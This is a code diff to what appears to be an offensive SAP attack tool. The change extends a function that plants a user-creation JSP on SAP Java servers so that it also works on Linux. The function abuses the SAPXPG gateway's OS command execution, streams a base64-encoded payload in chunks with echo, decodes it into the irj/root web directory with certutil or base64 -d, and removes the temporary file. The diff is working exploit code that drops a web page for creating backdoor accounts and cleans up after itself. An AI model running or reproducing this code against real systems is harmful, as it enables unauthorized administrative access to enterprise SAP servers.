@@ -240,10 +240,26 @@ def _random_jsp_name(prefix: str = "ume") -> str:
     return f"{prefix}{suffix}.jsp"
 
 
-def _java_root_path(sid: str, instance_nr: int) -> str:
-    """Canonical Windows path of the `irj/root/` web-app directory."""
-    return (f"C:\\usr\\sap\\{sid}\\J{int(instance_nr):02d}\\j2ee\\cluster\\apps\\"
+def _java_root_path(sid: str, instance_nr: int,
+                      os_type: str = "windows") -> str:
+    """Canonical path of the `irj/root/` web-app directory.
+
+    Picks backslash-rooted `C:\\usr\\sap\\…` for Windows or
+    forward-slash-rooted `/usr/sap/…` for Unix-family OSes.
+    """
+    inst = f"J{int(instance_nr):02d}"
+    if os_type.lower().startswith(("lin", "unix", "aix", "hp-ux",
+                                      "sol", "sunos")):
+        return (f"/usr/sap/{sid}/{inst}/j2ee/cluster/apps/"
+                f"sap.com/irj/servlet_jsp/irj/root")
+    return (f"C:\\usr\\sap\\{sid}\\{inst}\\j2ee\\cluster\\apps\\"
             f"sap.com\\irj\\servlet_jsp\\irj\\root")
+
+
+def _is_linux_target(node) -> bool:
+    ot = (getattr(node, "os_type", "") or "").upper()
+    return any(k in ot for k in ("LINUX", "UNIX", "AIX", "HP-UX",
+                                    "SUNOS", "SOLARIS"))
 
 
 # ---------------------------------------------------------------------------
@@ -380,9 +396,10 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
     """Drop the create-user JSP via SAPXPG gateway OS exec.
 
     Gateway SAPXPG has 128-byte EXTPROG / 255-byte PARAMS limits, so a
-    ~3 KB JSP must be written in chunks.  We base64-encode the JSP, stream
-    chunks to `%TEMP%\\sapmap_ume.b64` with `cmd.exe /C echo ...`, then call
-    `certutil -decode` to decode into `irj\\root\\<name>.jsp`.
+    ~3 KB JSP must be written in chunks.  We base64-encode the JSP,
+    stream chunks to a temp file via `cmd.exe /C echo` (Windows) or
+    `/bin/sh -c "echo"` (Linux), then decode with `certutil -decode` /
+    `base64 -d` into `irj/root/<name>.jsp`.
 
     `exec_fn` is a callable that takes `(command, params)` and runs them
     through `sapmap_exploit.execute_gw_command`.  Returns the same dict
@@ -390,8 +407,35 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
     """
     sid = node.sid
     jsp_name = _random_jsp_name("ume")
-    target_path = _java_root_path(sid, java_instance_nr) + "\\" + jsp_name
-    tmp_b64 = r"%TEMP%\sapmap_ume.b64"
+    linux = _is_linux_target(node)
+    os_label = "linux" if linux else "windows"
+    target_path = (_java_root_path(sid, java_instance_nr, os_label)
+                   + ("/" if linux else "\\") + jsp_name)
+
+    import random as _r
+    import string as _s
+    suffix = "".join(_r.choice(_s.ascii_lowercase) for _ in range(6))
+
+    if linux:
+        shell = "/bin/sh"
+        tmp_b64 = f"/tmp/sapmap_ume_{suffix}.b64"
+        chunk_size = 800  # POSIX shells have much more cmdline room
+
+        def echo_args(chunk, op):
+            return f'-c "echo {chunk} {op} {tmp_b64}"'
+
+        decode_args = f'-c "base64 -d {tmp_b64} > \\"{target_path}\\""'
+        cleanup_args = f'-c "rm -f {tmp_b64}"'
+    else:
+        shell = "cmd.exe"
+        tmp_b64 = r"%TEMP%\sapmap_ume.b64"
+
+        def echo_args(chunk, op):
+            return f"/C echo {chunk}{op}{tmp_b64}"
+
+        decode_args = (f'/C certutil.exe -decode {tmp_b64} '
+                        f'"{target_path}"')
+        cleanup_args = f"/C del /q {tmp_b64} 2>nul"
 
     jsp_b64 = base64.b64encode(UME_CREATE_JSP.encode("utf-8")).decode("ascii")
     chunks = [jsp_b64[i:i + chunk_size]
@@ -399,37 +443,39 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
 
     # 0) Clean up any prior leftover
     try:
-        exec_fn("cmd.exe", f"/C del /q {tmp_b64} 2>nul")
+        exec_fn(shell, cleanup_args)
     except Exception:
         pass
 
     # 1) Stream base64 chunks
     for idx, chunk in enumerate(chunks):
         op = ">" if idx == 0 else ">>"
-        r = exec_fn("cmd.exe", f"/C echo {chunk}{op}{tmp_b64}")
+        r = exec_fn(shell, echo_args(chunk, op))
         if not r.get("success"):
             return {"success": False,
                     "error": f"chunk {idx+1}/{len(chunks)} write failed: "
                              f"{r.get('error', '?')}"}
 
-    # 2) Decode to target JSP.  Wrap in cmd.exe /C so %TEMP% in the source
-    #    path expands — certutil invoked directly by SAPXPG doesn't resolve
-    #    environment variables and would ERROR_PATH_NOT_FOUND on %TEMP%\....
-    r = exec_fn("cmd.exe",
-                f'/C certutil.exe -decode {tmp_b64} "{target_path}"')
+    # 2) Decode to target JSP.  On Windows the /C wrapper is important
+    #    so %TEMP% in the source path expands (SAPXPG does not resolve
+    #    environment variables when invoking certutil directly).
+    r = exec_fn(shell, decode_args)
     if not r.get("success"):
         return {"success": False,
-                "error": f"certutil -decode failed: {r.get('error', '?')}"}
-    # Verify certutil actually decoded (it returns success exit code even
-    # on file errors; stdout lines tell us what really happened)
+                "error": f"decode step failed: {r.get('error', '?')}"}
+    # Verify decode actually wrote the file (the shell returns success
+    # exit code even on some file errors; stdout lines tell us more)
     out_text = " ".join(r.get("output") or [])
-    if "FAILED" in out_text or "ERROR" in out_text.upper():
-        return {"success": False,
-                "error": f"certutil reported error: {out_text[:200]}"}
+    low = out_text.lower()
+    for marker in ("failed", "error", "no such file",
+                     "can't exec external program", "exit code 1"):
+        if marker in low:
+            return {"success": False,
+                    "error": f"decode reported error: {out_text[:200]}"}
 
     # 3) Clean up the tmp base64 file
     try:
-        exec_fn("cmd.exe", f"/C del /q {tmp_b64} 2>nul")
+        exec_fn(shell, cleanup_args)
     except Exception:
         pass
 
